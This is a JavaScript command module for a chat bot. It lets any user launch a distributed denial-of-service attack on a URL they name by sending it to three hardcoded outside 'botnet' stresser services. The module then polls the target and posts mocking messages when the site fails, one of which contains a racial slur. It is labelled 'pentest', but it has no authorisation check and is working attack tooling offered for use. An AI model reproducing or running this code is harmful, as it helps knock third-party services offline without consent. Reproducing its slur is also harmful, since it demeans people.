const axios = require("axios");

const apiEndpoints = [
  "http://sgp1.hmvhostings.com:25694",
  "https://ddos-g01l.onrender.com",
  "https://haji-mix-botnet.onrender.com",
];

module.exports.config = {
  name: "ddos",
  aliases: ["cosmic", "dildos", "botnet", "su", "stresser"],
  type: "pentest",
  role: 0,
  isPrefix: true,
  info: "Perform DILDOS ATTACK on a target URL for pentest or testing purposes.",
  author: "Kenneth Panio",
  cd: 10,
  guide: "ddos http://example.com [--all] | ddos stop",
  usage: "[url] [--all] or [stop]",
};

module.exports.run = async ({ args, chat, font }) => {
  const targetUrl = args[0];
  const useAllEndpoints = args[1] === "--all";

  if (!targetUrl) {
    return chat.reply(font.thin("Please provide a URL or 'stop' command!"));
  }

  const checkEndpointAlive = async (endpoint) => {
    try {
      await axios.get(endpoint, { timeout: 10000 });
      return true;
    } catch (error) {
      return false;
    }
  };

  const tryAttack = async (apis) => {
    const helonegaownersv2 = targetUrl.toLowerCase() === "stop";
    const aliveEndpoints = helonegaownersv2
      ? apis
      : (await Promise.all(apis.map(async (api) => (await checkEndpointAlive(api)) ? api : null))).filter(Boolean);
    const botnetCount = helonegaownersv2 ? apis.length : aliveEndpoints.length;

    if (!helonegaownersv2 && botnetCount === 0) {
      return chat.reply(font.thin("No alive BOTNETs available, try again later!"));
    }

    try {
      let response;
      const preparingMessage = await chat.reply(
        font.bold(
          helonegaownersv2
            ? `Stopping DDOS with ${botnetCount} BOTNET(s)...`
            : `Preparing to attack target with ${botnetCount} active BOTNET(s)...`
        )
      );

      if (helonegaownersv2) {
        const responses = await Promise.all(
          apis.map((api) =>
            axios.get(`${api}/stop`, { timeout: 30000 }).catch(() => ({ data: { message: `Failed to stop on ${api}` } }))
          )
        );
        preparingMessage.delete();
        await chat.reply(
          font.thin(responses.map((res) => res.data.message || "Stop command sent!").join("\n"))
        );
        return;
      }

      if (useAllEndpoints) {
        const responses = await Promise.all(
          aliveEndpoints.map((api) =>
            axios.get(`${api}/stresser?url=${encodeURIComponent(targetUrl)}`, { timeout: 10000 })
          )
        );
        preparingMessage.delete();
        await chat.reply(
          font.thin(responses.map((res) => res.data.message || "Attack initiated successfully!").join("\n"))
        );
      } else {
        for (const api of aliveEndpoints) {
          try {
            response = await axios.get(
              `${api}/stresser?url=${encodeURIComponent(targetUrl)}`,
              { timeout: 10000 }
            );
            preparingMessage.delete();
            await chat.reply(font.thin(response.data.message || "Attack initiated successfully!"));
            break;
          } catch (error) {
            if (error.code === "ENOTFOUND" || error.code === "ECONNABORTED") {
              continue;
            }
            throw error;
          }
        }
      }

      let errorMessageSent = false;
      const attackInterval = setInterval(async () => {
        if (errorMessageSent) {
          clearInterval(attackInterval);
          return;
        }

        try {
          await axios.get(targetUrl.match(/^(https?:\/\/[^\/]+)/)[0]);
        } catch (error) {
          if (errorMessageSent) {
            clearInterval(attackInterval);
            return;
          }

          errorMessageSent = true;
          clearInterval(attackInterval);

          if (error.response) {
            if (error.response.status === 503) {
              await chat.reply(
                font.thin("Ako importante? putah! dildos saksispuli! Service Unavailable (503).")
              );
            } else if (error.response.status === 502) {
              await chat.reply(
                font.thin("Kamusta negrong may ari bersyong pangalawa! Bad Gateway (502).")
              );
            }
          }
        }
      }, 1000);
    } catch (error) {
      preparingMessage.delete();
      await chat.reply(font.thin("Error: " + error.message));
    }
  };

  await tryAttack(apiEndpoints);
};